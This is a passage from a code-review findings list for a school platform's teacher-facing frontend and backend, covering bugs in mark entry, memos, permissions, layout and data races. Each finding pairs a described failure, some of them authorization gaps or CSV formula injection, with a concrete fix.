- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/memo.service.ts:87`
- **Failure:** Anyone who reaches the unlinked URL /teacher/workbench/papers/<assessmentPaperId>/memo for a paper with no memo row sees the 'No memo yet' EmptyState whose only CTA is 'Generate Memo'. That fires POST /api/teacher-workbench/memos/generate/<id>; GeneratedPaper.findOne finds nothing (the id belongs to the assessmentpapers collection), the service throws NotFoundError('Paper not found'), and usePaperMemo.ts shows toast 'Paper not found'. The button can never succeed for any paper produced by the papers module.
- **Fix:** Either point MemoService at `AssessmentPaper` (importing from ../../QuestionBank/model.js as moderation.service.ts already does) and map its sections/questions shape, or delete the /teacher/workbench/papers/[id]/memo page and its usePaperMemo hook since the paper-detail Memo tab already covers this via the QuestionBank endpoints. If kept, replace `new PaperMemo({...}).save()` with `PaperMemo.findOneAndUpdate({ paperId, schoolId }, { $set: {...} }, { upsert: true, new: true })` so the unique paperId index cannot 500.

### 85. Mark-entry dialog writes 0 for every student the teacher left blank

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/assessment-structure/MarkEntryDialog.tsx:58`
- **Failure:** A teacher who reaches /teacher/curriculum/assessment-structure/<id>, opens the Term Marks tab and clicks 'Enter marks' on a line item for a 30-student class, types marks for the 8 scripts they have finished and presses Save. The 22 untouched rows go through `parseFloat('') || 0` and are upserted into the Mark collection as genuine 0/percentage 0 records. The term-marks table then shows 0% for those students, CalculationService treats them as marked, and StructureService.lock's 'every student has a mark' validation now passes, so the term can be locked with 22 fabricated zeros as final marks.
- **Fix:** In buildMarkEntries (MarkEntryDialog.tsx:57) filter first: `Object.entries(rows).filter(([, r]) => r.isAbsent || r.mark.trim() !== '')` so blanks are never sent, and add an 'n of m captured' counter next to the Save button in the DialogFooter so the teacher can see what will be written.

### 86. Structure lock-failure response shape does not match the client — LockValidationDialog never opens

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useAssessmentStructureDetail.ts:206`
- **Failure:** A teacher on /teacher/curriculum/assessment-structure/<id> presses 'Lock' on an active structure that still has missing marks. The 400 body is `{ success: false, error: 'Student 68f2a1... has no mark for line item "Test 1" in category "Tests".; Student 68f2a2... has no mark...' }`. `data.errors` is undefined, so LockValidationDialog never opens; extractErrorMessage returns the semicolon-joined string and Sonner shows one toast containing one sentence per (student × line item) pair with raw MongoDB ObjectIds and no student names. The hook then re-throws into `void onLock()`, producing an unhandled promise rejection.
- **Fix:** Change StructureController.lock to `res.status(400).json({ success: false, error: 'Cannot lock: some marks are missing', errors })` where errors is aggregated per line item as `{ lineItem, missingStudents, missingCount }` (the shape types/assessment-structure.ts:186 already declares), resolving student names in structure.service.ts instead of pushing `studentId.toString()`. Drop the `throw err` at useAssessmentStructureDetail.ts:210 since lock() already returns boolean.

### 87. Assessment-structure page renders full CRUD to every teacher, but all mutations require manage_academic_setup

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/AssessmentStructure/routes.ts:45`
- **Failure:** A plain school teacher (role 'teacher', not HOD, not principal, not standalone) opens /teacher/curriculum/assessment-structure. The list loads because GET '/' allows role 'teacher'. They click 'Create New', fill the CreateStructureDialog and submit — POST /api/assessment-structures returns 403 FORBIDDEN_CAPABILITY 'You do not have permission to manage academic setup.' The same happens for Add Category, Add Line Item, Activate, Lock, Unlock, Clone, Save Template and Add/Remove Students, so the page is read-only in practice while presenting itself as fully editable.
- **Fix:** Expose manage_academic_setup through useAuthStore permissions (campusly-frontend/src/lib/permissions.ts mirrors the backend rules) and use it in app/(dashboard)/teacher/curriculum/assessment-structure/page.tsx and components/assessment-structure/AssessmentStructureBuilder.tsx to hide or disable the mutation controls, rendering the builder read-only otherwise. Alternatively relax the backend guard for teacher-owned structures — StructureService already scopes every query through buildTenantFilter(teacherId/schoolId).

### 88. Workbench memo read/update ignore isDeleted and any owner check

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/memo.service.ts:216`
- **Failure:** Teacher A deletes a paper; cascadeMemoOnPaperDelete soft-deletes the memo. `GET /api/teacher-workbench/memos/paper/<paperId>` still returns the full memo — every expectedAnswer and mark allocation — because the query has no isDeleted filter. Separately, teacher B in the same school calls `PUT /api/teacher-workbench/memos/<memoId>` with a replacement sections array and silently overwrites teacher A's marking memo; there is no teacherId or paper-ownership check, unlike PUT /question-bank/papers/:id/memo which runs assertCanEditPaper(..., 'edit-memo').
- **Fix:** Add `isDeleted: false` to both queries in memo.service.ts, and before mutating in updateMemo load the memo's AssessmentPaper and run `assertCanEditPaper(paper, user.id, user.role, 'edit-memo')` (exported from QuestionBank/service-papers-auth.ts) — the controller must start passing req.user through. At minimum add `teacherId: user.id` to the filter for non-admin roles.


---

## LOW

### 1. Homework template feature is fully unwired — hook and both UI components are never rendered

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useHomeworkTemplates.ts:22`
- **Failure:** A teacher who sets similar homework weekly has no reuse path: none of /teacher/homework, /teacher/homework/new (steps 1-3) or /teacher/homework/[id] renders SaveAsTemplateButton or the homework TemplateSelector. The capability simply appears absent, while five authenticated backend routes ship with zero frontend callers.
- **Fix:** Either wire it — render TemplateSelector at the top of HomeworkWizardStep1.tsx to prefill the wizard store, and SaveAsTemplateButton in the header of teacher/homework/[id]/page.tsx, both backed by useHomeworkTemplates — or delete hooks/useHomeworkTemplates.ts, components/homework/{TemplateSelector,SaveAsTemplateButton}.tsx, lines 4-5 of components/homework/index.ts, and the template routes in campusly-backend/src/modules/Homework/routes.ts before ship.

### 2. 'View Linked Resource' on a reading homework ignores the resource id and lands on the generic content library

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/homework/[id]/page.tsx:147`
- **Failure:** Teacher opens a reading homework built on 'Chapter 5: Photosynthesis' and clicks the link labelled 'View Chapter 5: Photosynthesis', expecting the passage the class was assigned. They land on the unfiltered /teacher/curriculum/content index and have to search the library by hand to find the resource whose id the page already had in hand.
- **Fix:** In teacher/homework/[id]/page.tsx change the Link to `href={`/teacher/curriculum/content?resourceId=${homework.resourceId}`}` and have teacher/curriculum/content/page.tsx read that search param on mount to open/scroll to the matching resource.

### 3. `dark:bg-red-900/30` used for failed/alert/urgent badge states instead of the destructive token

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/communication/MessageBadges.tsx:38`
- **Failure:** A teacher on a dark-themed device views a partially failed bulk message on /teacher/communication. The "Failed" badge's background comes from Tailwind's raw red-900 rather than the destructive token, so if the theme's destructive hue is ever retuned this badge drifts out of step with every other destructive surface in the app.
- **Fix:** In src/components/communication/MessageBadges.tsx replace the `dark:bg-red-900/30` fragment on lines 8, 13, 20 and 38 with `dark:bg-destructive/25` so all four states resolve from `--destructive` in both themes.

### 4. Getting-started checklist can never be dismissed; the dismiss endpoint is dead code

- **Section:** n/a
- **Location:** `src/hooks/useOnboardingStatus.ts:79`
- **Failure:** A standalone teacher who uses Campusly purely for AI-generated papers and never invites learners completes three of the four steps. On every visit to /teacher the 3/4 "Getting started" card sits between the AI hero and their work zones with no way to close it, because step 4 can never be ticked and no dismiss control exists. The onboardingDismissed field on their User document stays false forever.
- **Fix:** Add an X button to the CardHeader in src/components/teacher-home/GettingStartedCard.tsx (new optional `onDismiss` prop) and wire it in src/app/(dashboard)/teacher/page.tsx:25 by destructuring `dismiss` from useOnboardingStatus and passing it down; then add `&& !onboarding.dismissed` to the showChecklist condition at page.tsx:40-43 and have dismiss() optimistically flip local status so the card hides without a refetch.

### 5. BottomNav overflow sheet uses a bare grid-cols-4 (no mobile breakpoint) for the 6 overflow standalone-nav items

- **Section:** n/a
- **Location:** `src/components/layout/BottomNav.tsx:53`
- **Failure:** A standalone teacher on a 320px phone taps "More" in the bottom nav. The sheet lays the six overflow items into four ~60px columns; 'Assignments' and 'Test Papers' wrap to two and three cramped lines respectively, leaving the row heights ragged and the labels hard to scan.
- **Fix:** In src/components/layout/BottomNav.tsx:53, change `grid grid-cols-4 gap-4 p-4 pb-6` to `grid grid-cols-3 gap-3 p-4 pb-6 sm:grid-cols-4 sm:gap-4` so the smallest viewport gets ~85px columns and the layout still uses four columns from 640px up.

### 6. CurriculumCoverage queries ignore isDeleted, and the coverage upsert has neither schoolId in its filter nor a class-ownership guard

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/curriculum.service.ts:165`
- **Failure:** A teacher crafts PATCH /api/teacher-workbench/curriculum/coverage/<topicId> with a `classId` for a class they do not teach (the body passes updateCoverageSchema, which only regex-checks the ObjectId shape). A coverage row is created under their own teacherId and their own schoolId claiming they covered a topic for that class, and it then feeds the HOD-facing coverage report and Department analytics (Department/service.analytics.ts:172). Impact is limited to polluting their own school's pacing numbers — no other teacher's or school's data is readable or writable.
- **Fix:** Attach `requireTeacherClassOwnership()` to the PATCH route in campusly-backend/src/modules/TeacherWorkbench/routes.ts:103-109 — the middleware already falls back to `req.body.classId` (teacherClassOwnership.ts:16) so no signature change is needed — and have CurriculumService.updateCoverage verify the topic exists in the caller's school before upserting. Adding `schoolId`/`isDeleted: false` to the filters is defensive hygiene, not a fix for a reachable bug.

### 7. Merits filter Selects store '' while their 'All' option value is 'all', so the trigger reverts to the placeholder

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/merits/page.tsx:202`
- **Failure:** A teacher on /teacher/merits picks 'Demerits' from the type filter — the trigger correctly reads 'Demerits'. She then picks 'All Types' to clear it. State becomes '' which matches no SelectItem value, so the trigger falls back to rendering the placeholder 'Filter type' rather than 'All Types'. The record list does refresh correctly, but the control no longer reflects its own state and reads as if no filter has ever been touched. Same for the category filter.
- **Fix:** Keep 'all' as the state sentinel: initialise `typeFilter`/`categoryFilter` to `'all'` in src/hooks/useTeacherMerits.ts:44-45, simplify the handlers at teacher/merits/page.tsx:202,212 to `setTypeFilter(val as string)`, and translate only at the request boundary in fetchMerits — `if (typeFilter !== 'all') params.type = typeFilter;`.

### 8. Generate Comments fires with an empty studentIds array, producing an opaque 400

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tutor/ReportCommentGenerator.tsx:159`
- **Failure:** Teacher opens /teacher/ai-tools/report-comments and selects a class + subject before useTeacherClasses has resolved students (or picks a class with no enrolments). The Generate button is enabled, POSTs studentIds: [], and the teacher gets a red toast reading 'Validation failed: ✖ Too small: expected array to have >=1 items → at studentIds' with no hint that the fix is 'this class has no students'. A class of 51+ students fails the same way against the .max(50) cap.
- **Fix:** In c:/Users/shaun/campusly-frontend/src/components/ai-tutor/ReportCommentGenerator.tsx:159 extend the disabled expression to `disabled={generating || !classId || !subjectId || classStudents.length === 0}` and render helper text under the button ('No students in this class yet' / '{n} students — comments are generated in batches of 50'). In useReportComments.ts:22-42 chunk payload.studentIds into slices of 50 and merge the results so large classes work instead of 400ing.

### 9. Generate-all runs 3 concurrent regenerations, but moveMaterial does a whole-array read-modify-write that can orphan a sibling's new material

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Lesson/service-materials.ts:256`
- **Failure:** Teacher clicks 'Generate 5' in the workspace banner. Two of the three workers finish their AI calls within the same millisecond and both target placeholders in the same phase. Worker B's moveMaterial reads phases[practice].materialIds; before B's save lands, worker A's addMaterial $pushes its new material id into that same array. B's save $sets the array from its stale snapshot, dropping A's id. A's generated (and billed-for) worksheet still exists in lesson.materials but belongs to no phase, so LessonPhaseSection.tsx:63-65 filters it out of the workspace — it never renders, never exports, and cannot be deleted from the UI.
- **Fix:** Rewrite moveMaterial in campusly-backend/src/modules/Lesson/service-materials.ts:249-271 as two atomic updates — `Lesson.updateOne(filter, { $pull: { 'phases.$[].materialIds': matId } })` followed by `Lesson.updateOne(filter, { $push: { 'phases.$[ph].materialIds': { $each: [matId], $position: insertAt } } }, { arrayFilters: [{ 'ph.phase': toPhase }] })` — and fix the inaccurate atomicity comment at service-materials-bulk.ts:224-230.

### 10. Resource-picker failures are rendered as "nothing exists" empty states with misleading calls to action

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/lessons/drawers/QuizDrawer.tsx:37`
- **Failure:** A non-standalone teacher at a school where the 'learning' module is switched off (or during a transient 5xx from GET /learning/quizzes) opens the Quiz material drawer. requireModule('learning') rejects the request, the hook sets error and empties items, and the drawer renders 'No quizzes available — Create a quiz in the Learning module first' with a 'Go to Learning' button that leads to a surface the school does not have.
- **Fix:** Destructure `error` alongside `items, loading` in campusly-frontend/src/components/lessons/drawers/QuizDrawer.tsx:37 (and the same in PaperDrawer.tsx:52, PracticeQuestionsDrawer, and the content-resource picker) and render a distinct failure state — message plus a retry — before the 'nothing created yet' EmptyState.

### 11. Frontend capability mirror is defeated by role normalization — can() checks 'school_admin' but the shell rewrites it to 'admin'

- **Section:** n/a
- **Location:** `campusly-frontend/src/lib/permissions.ts:21`
- **Failure:** A school_admin created outside the standalone/registerTeacher flows (e.g. via the seed script or a /auth/register call passing role 'school_admin') and therefore without isSchoolPrincipal opens /teacher/timetable. The backend would accept their period-configuration writes, but useCan('manage_school_config') returns false because the stored user's role was rewritten to 'admin', so the 'Configure periods' control is disabled and the same user sees the no-permission state on /admin/audit and hidden Add/Edit controls on /admin/staff.
- **Fix:** In campusly-frontend/src/lib/permissions.ts, widen isSchoolAdmin to `u.role === 'school_admin' || u.role === 'admin' || u.isSchoolPrincipal === true`, and record the intentional divergence from the backend mirror in the header comment plus both permissions.snapshot.json files so scripts/check-permissions-sync.sh still passes.

### 12. useSubscription fires an uncaught fetch from two banners and has no error state

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useSubscription.ts:20`
- **Failure:** A teacher signs in. useAuth.login seeds the store without a subscription, so TrialBanner and DunningBanner both mount useSubscription with subscription still null and each issue GET /api/subscriptions/me — two identical requests per login. If either fails (the user has no schoolId, so SubscriptionController.getMine's schoolIdFromReq throws `Authenticated user has no schoolId` and 500s), the `void refetch()` rejection is unhandled — 'Uncaught (in promise)' in the console and a Next dev error overlay — and isPro silently stays false, so Pro-gated controls disappear with no error or retry shown.
- **Fix:** Add a `catch (err: unknown) { setError(true); }` branch (with an `error` flag and the existing refetch exposed as a retry) to refetch in campusly-frontend/src/hooks/useSubscription.ts, and pass subscription/plan through useAuth.login into storeLogin — useAuthStore.login already accepts `(user, tokens, subscription = null, plan = null)` — so the banners never need to fetch at all.

### 13. Mobile 'More' sheet uses a bare grid-cols-4

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/layout/BottomNav.tsx:53`
- **Failure:** On a 320px phone a teacher taps 'More' in the bottom nav. The overflow sheet lays the ~10 remaining TEACHER_NAV entries out in a hard-coded 4-column grid, giving each cell roughly 62px, so labels like 'Virtual Classroom' and 'Student Welfare' wrap to three lines and the tiles read as a dense block rather than distinct targets.
- **Fix:** In campusly-frontend/src/components/layout/BottomNav.tsx line 53, change `grid grid-cols-4 gap-4 p-4 pb-6` to `grid grid-cols-3 gap-4 p-4 pb-6 sm:grid-cols-4` and bump the per-cell padding so each tile keeps a 44px minimum touch target.

### 14. Rate-limit and API error bodies use `message` while the auth screens read `.error`

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/login/page.tsx:41`
- **Failure:** A teacher on a busy school network trips the shared-IP auth limiter on /login. The backend returns {success:false, message:'Too many requests, please try again later'}, but the page only reads response.data.error, so the toast falls back to axios's own text and reads 'Request failed with status code 429'. Likewise on /auth/change-password: entering the wrong temporary password shows 'Request failed with status code 401' instead of the backend's 'Current password is incorrect'.
- **Fix:** Replace the hand-rolled axios error parsing in campusly-frontend/src/app/login/page.tsx (line 39-42) and src/app/auth/change-password/page.tsx (line 46) with `extractErrorMessage(err, '<fallback>')` from '@/lib/api-helpers', which already resolves error → message → fallback; apply the same to the register-teacher and signup/teacher pages and to CancelDialog.tsx's `err instanceof Error` branch.

### 15. Whiteboard provider leaks socket and window listeners on every Board-tab visit (destroy() never called)

- **Section:** n/a
- **Location:** `src/hooks/useExcalidrawCollaboration.ts:65`
- **Failure:** Teacher flips between Chat, People and Board a dozen times during a 40-minute lesson. Each visit constructs a fresh SocketIOProvider; the cleanup's disconnect() short-circuits because the socket never connected, so each cycle leaves a live 5 s resync interval, a beforeunload listener, an awareness instance and a BroadcastChannel subscription attached, on top of a doc.destroy() executed while the provider is still bound to that doc.
- **Fix:** In the effect cleanup of src/hooks/useExcalidrawCollaboration.ts, call `provider.destroy()` (which disconnects internally) before `doc.destroy()`, and consider hoisting the provider above the Tabs so it survives tab switches instead of being rebuilt on every visit.

### 16. AssignCourseDialog does not use the mandated scrollable dialog shell

- **Section:** n/a
- **Location:** `src/components/courses/AssignCourseDialog.tsx:72`
- **Failure:** Teacher on a landscape phone (~360 px viewport height) opens Assign Course, picks a class so the 'N students will be enroled' notice appears. The dialog is centred with -translate-y-1/2 and has no max-height, so the footer sits below the viewport with nothing to scroll it into view — the Assign button cannot be tapped and the class cannot be enroled from that device.
- **Fix:** In src/components/courses/AssignCourseDialog.tsx change line 72 to `<DialogContent className="sm:max-w-md flex flex-col max-h-[85vh]">` and wrap the class-select block (lines 82-121) in `<div className="flex-1 overflow-y-auto py-4">`, matching CreateCourseDialog.tsx:122.

### 17. Switching term leaves a stale out-of-term assessment selected — marks are captured against the wrong term while the picker reads 'Pick assessment'

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useTeacherGrades.ts:162`
- **Failure:** Teacher is on Enter marks with 'June Test' (Term 2) selected and flips the header term picker to Term 3. The assessment dropdown now lists only Term 3 items and its trigger reads 'Select assessment', but the info card, the marks table, the class-stats bar and Save Marks below it are still bound to 'June Test' — anything typed and saved lands on the Term 2 assessment. If Term 3 has no assessments at all, page.tsx:295's `assessments.length === 0 && !selectedAssessment` guard is false (selectedAssessment is still truthy), so the 'No assessments for this term yet' empty state is suppressed too.
- **Fix:** Add `selectedTerm` to the reset effect in useTeacherGrades.ts:80-85 (clear selectedAssessment and markEntries when the term changes), or drop the `?? allAssessments.find(...)` fallback at :163 so an out-of-scope selection resolves to undefined and the grid plus the page.tsx:295 empty state behave consistently.

### 18. Gradebook CSV export does no quoting or formula-injection escaping

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/grades/page.tsx:82`
- **Failure:** A teacher clicks Export CSV on Enter marks for an assessment named 'Test 2, Chapter 4'. Line 2 of the file is `Assessment: Test 2, Chapter 4`, which Excel splits across two columns. A learner whose recorded surname contains a comma or a double quote shifts that row's mark and percentage one column right, so the row read from the sheet attributes the mark to the wrong field; a name beginning with '=' or '+' is evaluated as a formula when the file is opened.
- **Fix:** In exportCSV (grades/page.tsx:62-90) add a local escape helper mirroring escapeCSV in campusly-backend/src/modules/Academic/controllers/misc.controller.ts:190-208 — prefix values matching /^[=+@\-]/ with an apostrophe and wrap any value containing a comma, double quote or newline in quotes with internal quotes doubled — and apply it in the `rows.map((r) => r.map(esc).join(','))` at line 82.

### 19. Student history dialog shows 'No assessment history found' while the request is still in flight

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/grades/StudentHistoryDialog.tsx:54`
- **Failure:** On Enter marks a teacher taps a learner's name. The dialog opens immediately with the learner's name in the title and the body reading 'No assessment history found for this student.', then after the round trip the table pops in. On a slow school connection the teacher reads the false empty state and closes the dialog believing the learner has no marks. If they then tap a second learner, the first learner's table and 'Overall average' are shown under the second learner's name until the new fetch resolves. A failed request shows the same 'no history' message with no distinction from a genuinely empty history.
- **Fix:** In useTeacherGrades.ts add `historyLoading` state, set it true at the top of fetchStudentHistory (:288) and false in a finally block, clear `setStudentHistory([])` before the GET so stale data cannot show, and return the flag. In StudentHistoryDialog.tsx replace the `!student` check at :52 with `historyLoading` (passed as a prop) for the spinner branch, and add a distinct error message branch.

### 20. Batch confirm and issueMarking trust a client-supplied studentId without verifying it belongs to the batch class or the school

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/AITools/service-marking-batch-confirm.ts:75`
- **Failure:** A teacher hand-crafts POST /api/ai-tools/batches/<id>/confirm with a studentId belonging to a different class in the same school (or a random valid 24-hex ObjectId). It is accepted: the PaperMarking is created with that studentId and classId=batch.classId, and on issue the Mark is upserted onto this school's assessment for a student who never sat the paper — and, because schoolId matches, that student's Tests page will show the stranger's marked paper. A random non-existent id produces an orphan marking that silently never reaches anyone. No error is surfaced either way.
- **Fix:** In confirmBatch (campusly-backend/src/modules/AITools/service-marking-batch-confirm.ts), load `Student.find({ classId: batch.classId, schoolId, isDeleted: false }).select('_id')` once and throw BadRequestError for any assignment whose studentId is not in that set; in issueMarking (service-marking-queries.ts:113) verify the resolved studentId exists via `Student.exists({ _id: resolvedStudentId, schoolId, isDeleted: false })` before calling publishMarkToGradebook.

### 21. MarkingResultsPanel is dead code — imported nowhere and duplicates MarkingResults' review UI

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tools/MarkingResultsPanel.tsx:38`
- **Failure:** No teacher-visible failure — this is maintenance risk only. A developer asked to change the marking review panel (for example to add the failed-status banner from finding 4) edits MarkingResultsPanel because of its name, ships it, and nothing changes in the product, because the file is unreachable. It also still carries the superseded onAccept/onAdjustMark contract and hardcoded score colours that no longer match the live component.
- **Fix:** Delete campusly-frontend/src/components/ai-tools/MarkingResultsPanel.tsx (nothing imports it, so no other edit is required), or add it to components/ai-tools/index.ts and wire it to a real surface if it is meant to replace MarkingResults.

### 22. Review-workflow state transitions update without a schoolId filter (project rule: every query must be school-scoped)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/ContentLibrary/service-review.ts:28`
- **Failure:** No teacher-visible failure today — the school-scoped pre-check makes the unscoped write unreachable in practice. The exposure is latent: any future refactor that removes, reorders, or short-circuits the pre-check (or a race in which the document is moved or soft-deleted between the read and the write) would let a status transition land on a document never verified as belonging to the caller's school.
- **Fix:** Add `schoolId: soid` to both filters in campusly-backend/src/modules/ContentLibrary/service-review.ts — line 29 becomes `{ _id: oid, schoolId: soid, isDeleted: false }`, and the same at line 60 — so the write carries the same tenancy predicate as the read that precedes it.

### 23. Structure lock validation issues one Mark.findOne per (line item × student)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/AssessmentStructure/services/structure.service.ts:294`
- **Failure:** An HOD or standalone teacher locks a term structure with 4 categories × 3 line items for a class of 35: the request performs 420 sequential Mark.findOne round trips before responding. Because the Lock button has no pending or disabled state, the teacher sees no feedback and clicks again, stacking a second full pass.
- **Fix:** Replace the nested loop with one batched read — `const marks = await Mark.find({ assessmentId: { $in: assessmentIds }, studentId: { $in: studentIds }, schoolId, isDeleted: false }).select('assessmentId studentId').lean()` — index it into a Set keyed by `${assessmentId}:${studentId}` and validate in memory, mirroring CalculationService.getTermMarks in calculation.service.ts. Add `disabled={locking}` plus a spinner to the Lock button in AssessmentStructureBuilder.tsx:104.

### 24. Unwired controls in the assessment-structure builder (Export, hardcoded unlock reason, silent Enter-marks no-op)

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/assessment-structure/AssessmentStructureBuilder.tsx:116`
- **Failure:** On /teacher/curriculum/assessment-structure/<id>, after locking, the teacher clicks 'Export' to hand term marks to the office and absolutely nothing happens — no download, no toast, no network call — even though GET /api/assessment-structures/:id/export is implemented and permits teachers. Every Unlock writes the audit reason as the literal 'Manual unlock', making the persisted unlockReason field useless. On the Term Marks tab, clicking 'Enter marks' for a line item that has no linked assessmentId does nothing and gives no hint that the line item must be linked first.
- **Fix:** Wire Export to `GET /assessment-structures/${id}/export` with a blob download (reuse the pattern in useTeacherPapers.downloadPaperPdf), prompt for a reason in a small dialog before calling onUnlock instead of passing 'Manual unlock', and give the `if (assessmentId)` guard in assessment-structure/[id]/page.tsx an else branch that toasts 'Link this line item to an assessment before capturing marks.'

### 25. ~1,600 lines of unreferenced paper/assessment components and hooks, including the section's only bare grid-cols violations

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/papers/PaperWizard.tsx:50`
- **Failure:** A maintainer asked to fix a paper-wizard bug opens src/components/papers/PaperWizardStep1.tsx — the largest, most wizard-looking file in the section — makes the change and ships it with zero runtime effect, because the live wizard is src/app/(dashboard)/teacher/papers/new/_PapersNewWizard.tsx. Likewise hooks/usePaperSubmissions.ts is a complete hook against a real endpoint (GET /question-bank/papers/:id/submissions) that no component consumes, so a reviewer cannot tell whether the submissions feature shipped — the paper-detail page has only Paper/Memo/Assign/Marking tabs.
- **Fix:** Delete src/components/papers/PaperWizard.tsx, PaperWizardStep1.tsx, PaperWizardAIConfig.tsx, PaperWizardManualConfig.tsx, paper-wizard-helpers.ts, src/components/workbench/papers/PaperConfigPanel.tsx, PaperBuilderPanel.tsx, QuestionBankBrowser.tsx, src/components/assessment-structure/TemplateSelectDialog.tsx and src/hooks/usePaperSubmissions.ts — or wire usePaperSubmissions into a Submissions tab on app/(dashboard)/teacher/papers/[id]/page.tsx if that feature is meant to ship.

### 26. AI wrong-paper flag returned by the marking roster but never rendered; destructive actions have no confirmation

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/papers/PaperDetailMarkingTab.tsx:279`
- **Failure:** A teacher batch-marks 30 scanned scripts and one student photographed a different subject's paper. The marking service sets paperMismatch true and downgrades status to 'needs_review'; the roster API returns the flag, but the row shows only a neutral 'Needs review' badge, so the teacher cannot tell 'AI unsure about a borderline answer' from 'wrong paper entirely' without opening each review dialog. Separately, one stray click on the ghost X in the Assign tab immediately deletes a class assignment, and one click on the trash icon in the Paper tab deletes a question — neither confirms, and there is no undo.
- **Fix:** In MarkingPill (PaperDetailMarkingTab.tsx:279) accept the roster's `marking.paperMismatch` and render a destructive badge/tooltip when true, mirroring components/ai-tools/MarkingResults.tsx:114. Wrap removeAssignment in PaperDetailAssignmentsTab.tsx and handleDelete in PaperDetailPaperTab.tsx in the ConfirmDialog component the papers list page already uses.

